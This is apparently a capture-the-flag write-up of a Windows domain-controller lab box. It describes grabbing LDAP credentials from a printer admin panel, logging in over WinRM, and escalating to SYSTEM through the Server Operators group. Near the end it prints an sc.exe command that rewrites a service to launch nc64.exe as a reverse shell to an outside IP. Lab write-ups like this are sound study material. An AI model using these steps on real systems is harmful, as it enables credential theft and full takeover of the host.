Main steps
1. 

Learning points
1. Printer LDAP stuff
2. Privesc via `Server Operators` AD group
3. If launching `nc64.exe` via a service, use `cmd.exe` to spawn the process so it doesn't die

`nmap`
![[Pasted image 20260330203134.png]]

A bunch of ports open, but most notably: port 80 (web server), ports 88, 139, 389, 445 - common ports for a DC, and port 5985 - `WinRM`.

Ran `nxc smb` to enumerate the SMB shares and got the host name: `PRINTER.return.local`, but was unable to enumerate shares.
![[Pasted image 20260330203515.png]]

Navigating to the website shows a printer admin panel, with some information in the settings page, including a server address that matches the host name above.
![[Pasted image 20260330203554.png]]

Looks like this panel is trying to make an LDAP connection to the remote server using the username and password. For printers to query user lists, they usually store LDAP or SMB credentials.

I pointed the server address to my own machine's IP and started a listener with `nc`, then clicked on update, and received what looks like credentials.
![[Pasted image 20260330203937.png]]
![[Pasted image 20260330203930.png]]

`svc-printer`:` 1edFg43012!! `

Tried authenticating to SMB using these credentials and was able to.
![[Pasted image 20260330204053.png]]

Since `WinRM`'s port was exposed, I tried to connect with that as well, and was also successful.
![[Pasted image 20260330204300.png]]

Ran `evil-winrm` and got a shell as `svc-printer`.
![[Pasted image 20260330204403.png]]

Checking `whoami /all` shows a lot of interesting groups and privileges that the `svc-printer` account has.
![[Pasted image 20260330205312.png]]

A few of the privileges here can lead to privilege escalation, such as `SeMachineAccountPrivilege` or `SeLoadDriverPrivilege`, and `SeBackupPrivilege` allows for arbitrary file reads.

Looking at the groups this account is part of, the `BUILTIN\Server Operators` group stands out. Someone in the group is able to create and delete network shared resources, start and stop services, back up and restore files, format the hard disk drive of the computer. Referring to this writeup https://github.com/cube0x0/cube0x0.github.io/blob/master/_posts/2020-03-3-Pocing-Beyond-DA.md, members of this group can read arbitrary files, and modify services to execute commands as `SYSTEM`.

Uploaded `nc64.exe` to the server, then modified a service named `VSS` to run `nc` to connect to my machine.
![[Pasted image 20260330205657.png]]

While this did work and I was able to get a connection, it died almost immediately. This is most likely due to the service not starting properly and killing itself. This can be circumvented by launching `cmd.exe` and using that to launch `nc64.exe` so that it continues to run even after the `cmd.exe` process is killed.
`sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.14.82 4444"`
![[Pasted image 20260330205833.png]]

Ran the service config, restarted the `VSS` service, and got a reverse shell as `nt authority\system`.
![[Pasted image 20260330205937.png]]

